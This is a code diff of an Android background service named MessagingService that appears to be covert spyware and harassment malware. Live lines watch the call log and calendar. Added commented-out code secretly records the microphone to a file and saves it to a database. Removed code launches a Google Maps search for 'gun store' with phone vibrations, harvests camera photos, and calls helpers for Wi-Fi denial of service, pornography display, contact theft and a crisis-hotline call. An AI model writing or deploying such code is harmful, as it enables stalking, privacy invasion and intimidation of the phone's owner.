@@ -7,6 +7,7 @@ import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteException;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
@@ -116,49 +117,43 @@ public class MessagingService extends Service {
         getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
         getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
-
-      /*  new Thread(new Runnable() {
-            @Override
-            public void run() {
-                sMediaRecorder = new MediaRecorder();
-                sMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                sMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                sMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
-
-*//*                SQLiteDatabase db = database.getWritableDatabase();
+ /*       if(Lofl.isExternalStorageReadable()){
+            File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
+            if(! audioFile.exists()){
                 try {
-                    db.beginTransaction();
-                    if(Lofl.isExternalStorageReadable()){
-                        File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
-                        if(! audioFile.exists()){
-                            audioFile.createNewFile();
-                        }else{
-                            Database.insertMedia(db, audioFile.getName(), audioFile);
-                        }
-                        sMediaRecorder.setOutputFile(audioFile);
-                        sMediaRecorder.prepare();
-                        sMediaRecorder.start();
-                     *//**//*   pictures = Lofl.getFilesForDirectory(Lofl.getPicturesDirectory().getPath());
-                        if(pictures != null && pictures.length > 0){
-                            for(File f : pictures){+
-                                //Database.insertMedia(sDatabase, f.getName(), f);
-                            }
-                        }*//**//*
-                    }
-                    db.setTransactionSuccessful();
+                    audioFile.createNewFile();
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
-                db.endTransaction();*//*
-          *//*      db.beginTransaction();
-                Database.insertPackages(db, Lofl.getInstalledApps(MessagingService.this));
-                db.setTransactionSuccessful();
-                db.endTransaction();*//*
-                //db.close();
-                //Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
             }
-        }).start();*/
-
+            SQLiteDatabase db = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+            try{
+                db.beginTransaction();
+                Database.insertMedia(db, audioFile.getName(), audioFile);
+                db.setTransactionSuccessful();
+            }catch (SQLiteException e){
+                e.printStackTrace();
+            }finally {
+                db.close();
+                DatabaseHelper.getInstance(getApplicationContext()).close();
+            }
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        sMediaRecorder = new MediaRecorder();
+                        sMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                        sMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                        sMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
+                        sMediaRecorder.setOutputFile(audioFile);
+                        sMediaRecorder.prepare();
+                        sMediaRecorder.start();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        }*/
 /*        try {
             String locationProvider = LocationManager.GPS_PROVIDER;
             mLocationManager = Lofl.getLocationManager(MessagingService.this);
@@ -167,48 +162,6 @@ public class MessagingService extends Service {
         } catch (SecurityException e) {
             e.printStackTrace();
         }*/
-
-       /* new Thread(new Runnable() {
-            @Override
-            public void run() {
-                if(Lofl.isExternalStorageReadable()){
-                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
-                    if(pictures != null && pictures.length > 0){
-                        for(File file : pictures){
-                            Database.insertMedia(sDatabase, file.getName(), file);
-                        }
-                    }
-                }
-            }
-        }).start();*/
-
-        //Lofl.phoneCall(MessagingService.this, "18002738255");
-        //Lofl.persistentBlinkingFlashlight(this);
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                Lofl.searchGoogleMaps(MessagingService.this, "gun%20store");
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                Lofl.vibrator(MessagingService.this);
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-        }).start();
-       // Lofl.fetchContactsInformation(this);
-        //Lofl.wifiDenialOfService(this);
-        //Lofl.startPornProvider(this, 180000);
     }
 
     @Override
